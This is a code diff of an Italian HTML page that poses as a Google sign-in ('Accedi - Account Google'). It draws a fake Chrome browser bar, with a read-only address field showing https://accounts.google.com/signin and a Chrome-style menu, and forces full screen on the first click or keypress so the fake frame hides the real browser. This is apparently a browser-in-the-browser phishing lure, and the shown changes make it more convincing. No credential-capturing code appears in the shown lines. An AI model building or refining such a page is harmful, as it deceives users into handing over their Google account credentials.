@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Account Google</title>
+    <title>Accedi - Account Google</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -12,7 +13,7 @@
         }
 
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
             background-color: #fff;
             height: 100vh;
             width: 100vw;
@@ -23,19 +24,19 @@
         /* BARRA DEL BROWSER */
         .browser-bar {
             width: 100%;
-            height: 60px;
-            background-color: #f0f0f0;
+            height: 56px;
+            background-color: #f3f3f3;
             border-bottom: 1px solid #dadce0;
             display: flex;
             align-items: center;
-            padding: 0 12px;
-            gap: 8px;
+            padding: 8px 12px;
+            gap: 4px;
         }
 
         .browser-button {
-            width: 36px;
-            height: 36px;
-            border-radius: 4px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
             border: none;
             background-color: transparent;
             cursor: pointer;
@@ -43,20 +44,24 @@
             align-items: center;
             justify-content: center;
             color: #202124;
-            font-size: 18px;
-            transition: background-color 0.2s;
+            font-size: 16px;
+            transition: all 0.2s;
         }
 
         .browser-button:hover {
-            background-color: #e8e8e8;
+            background-color: rgba(0, 0, 0, 0.1);
+        }
+
+        .browser-button:active {
+            background-color: rgba(0, 0, 0, 0.15);
         }
 
         .address-bar {
             flex: 1;
-            height: 36px;
-            background-color: white;
+            height: 40px;
+            background-color: #f0f0f0;
             border: 1px solid #dadce0;
-            border-radius: 20px;
+            border-radius: 24px;
             padding: 0 16px;
             display: flex;
             align-items: center;
@@ -77,9 +82,72 @@
             color: #80868b;
         }
 
-        /* ICONE BROWSER */
-        .browser-icon {
-            font-size: 16px;
+        .address-bar input:focus {
+            background-color: white;
+        }
+
+        .address-bar:focus-within {
+            background-color: white;
+            border-color: #dadce0;
+            box-shadow: 0 1px 6px rgba(32, 33, 36, 0.08);
+        }
+
+        /* MENU DROPDOWN */
+        .menu-container {
+            position: relative;
+        }
+
+        .menu-button {
+            width: 32px;
+            height: 32px;
+        }
+
+        .menu-dropdown {
+            position: absolute;
+            top: 48px;
+            right: 0;
+            background-color: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            min-width: 320px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15);
+            display: none;
+            z-index: 1000;
+        }
+
+        .menu-dropdown.active {
+            display: block;
+        }
+
+        .menu-section {
+            padding: 8px 0;
+            border-bottom: 1px solid #dadce0;
+        }
+
+        .menu-section:last-child {
+            border-bottom: none;
+        }
+
+        .menu-item {
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            color: #202124;
+            text-decoration: none;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .menu-item:hover {
+            background-color: #f8f9fa;
+        }
+
+        .menu-item i {
+            width: 20px;
+            text-align: center;
+            color: #5f6368;
         }
 
         /* CONTENT AREA */
@@ -97,6 +165,7 @@
             border: 1px solid #dadce0;
             border-radius: 8px;
             text-align: center;
+            background-color: white;
         }
 
         .logo {
@@ -159,39 +228,77 @@
             font-size: 12px;
             color: #5f6368;
         }
-
-        /* FIREFOX SPECIFIC */
-        .firefox .address-bar {
-            border-radius: 8px;
-            padding: 0 12px;
-        }
-
-        /* SAFARI SPECIFIC */
-        .safari .address-bar {
-            border-radius: 10px;
-        }
-
-        /* OPERA SPECIFIC */
-        .opera .address-bar {
-            border-radius: 4px;
-        }
     </style>
 </head>
 <body>
 
     <!-- BARRA DEL BROWSER -->
     <div class="browser-bar" id="browserBar">
-        <button class="browser-button" id="backBtn">◀</button>
-        <button class="browser-button" id="forwardBtn">▶</button>
-        <button class="browser-button" id="reloadBtn">⟲</button>
+        <button class="browser-button" id="backBtn" title="Indietro">
+            <i class="fas fa-arrow-left"></i>
+        </button>
+        <button class="browser-button" id="forwardBtn" title="Avanti">
+            <i class="fas fa-arrow-right"></i>
+        </button>
+        <button class="browser-button" id="reloadBtn" title="Ricarica">
+            <i class="fas fa-redo"></i>
+        </button>
         
         <div class="address-bar">
-            <span class="browser-icon">🔒</span>
-            <input type="text" id="urlInput" placeholder="https://accounts.google.com" readonly>
+            <input type="text" id="urlInput" value="https://accounts.google.com/signin" readonly>
         </div>
         
-        <button class="browser-button" id="starBtn">☆</button>
-        <button class="browser-button" id="menuBtn">≡</button>
+        <button class="browser-button" id="starBtn" title="Aggiungi ai segnalibri">
+            <i class="far fa-star"></i>
+        </button>
+
+        <div class="menu-container">
+            <button class="browser-button menu-button" id="menuBtn" title="Menu">
+                <i class="fas fa-ellipsis-v"></i>
+            </button>
+            <div class="menu-dropdown" id="menuDropdown">
+                <div class="menu-section">
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-window-restore"></i>
+                        <span>Nuova finestra</span>
+                    </a>
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-user-secret"></i>
+                        <span>Nuova finestra anonima</span>
+                    </a>
+                </div>
+                <div class="menu-section">
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-bookmark"></i>
+                        <span>Segnalibri</span>
+                    </a>
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-history"></i>
+                        <span>Cronologia</span>
+                    </a>
+                </div>
+                <div class="menu-section">
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-download"></i>
+                        <span>Download</span>
+                    </a>
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-cog"></i>
+                        <span>Impostazioni</span>
+                    </a>
+                </div>
+                <div class="menu-section">
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-question-circle"></i>
+                        <span>Guida</span>
+                    </a>
+                    <a class="menu-item" href="#">
+                        <i class="fas fa-info-circle"></i>
+                        <span>Informazioni su Chrome</span>
+                    </a>
+                </div>
+            </div>
+        </div>
     </div>
 
     <!-- CONTENUTO PRINCIPALE -->
@@ -226,27 +333,43 @@
     </div>
 
     <script>
-        // RILEVA IL BROWSER
-        function detectBrowser() {
-            const ua = navigator.userAgent;
-            const browserBar = document.getElementById('browserBar');
-            
-            if (ua.indexOf('Firefox') > -1) {
-                browserBar.classList.add('firefox');
-                document.getElementById('urlInput').placeholder = 'Ricerca o indirizzo';
-            } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
-                browserBar.classList.add('safari');
-            } else if (ua.indexOf('OPR') > -1 || ua.indexOf('Opera') > -1) {
-                browserBar.classList.add('opera');
-            } else {
-                // Chrome di default
-                document.getElementById('urlInput').placeholder = 'https://accounts.google.com';
+        const menuBtn = document.getElementById('menuBtn');
+        const menuDropdown = document.getElementById('menuDropdown');
+        const starBtn = document.getElementById('starBtn');
+
+        // Menu dropdown
+        menuBtn.addEventListener('click', () => {
+            menuDropdown.classList.toggle('active');
+        });
+
+        // Chiudi menu quando clicchi fuori
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.menu-container')) {
+                menuDropdown.classList.remove('active');
             }
-        }
+        });
+
+        // Star button
+        starBtn.addEventListener('click', function() {
+            this.querySelector('i').classList.toggle('far');
+            this.querySelector('i').classList.toggle('fas');
+        });
+
+        // Bottoni browser
+        document.getElementById('backBtn').addEventListener('click', () => {
+            history.back();
+        });
+
+        document.getElementById('forwardBtn').addEventListener('click', () => {
+            history.forward();
+        });
+
+        document.getElementById('reloadBtn').addEventListener('click', () => {
+            location.reload();
+        });
 
         function goFullscreen() {
             const elem = document.documentElement;
-            
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(err => {
                     console.log('Errore fullscreen:', err);
@@ -265,33 +388,8 @@
             document.querySelector('.container').style.display = 'block';
         }
 
-        // Event listeners per i bottoni
-        document.getElementById('backBtn').addEventListener('click', () => {
-            alert('Torna indietro (simulato)');
-        });
-
-        document.getElementById('forwardBtn').addEventListener('click', () => {
-            alert('Vai avanti (simulato)');
-        });
-
-        document.getElementById('reloadBtn').addEventListener('click', () => {
-            location.reload();
-        });
-
-        document.getElementById('starBtn').addEventListener('click', function() {
-            this.textContent = this.textContent === '☆' ? '★' : '☆';
-        });
-
-        document.getElementById('menuBtn').addEventListener('click', () => {
-            alert('Menu (simulato)');
-        });
-
-        // Attiva fullscreen e contenuto
         document.body.addEventListener('click', showContent, { once: true });
         document.addEventListener('keydown', showContent, { once: true });
-
-        // Rileva il browser
-        detectBrowser();
     </script>
 
 </body>
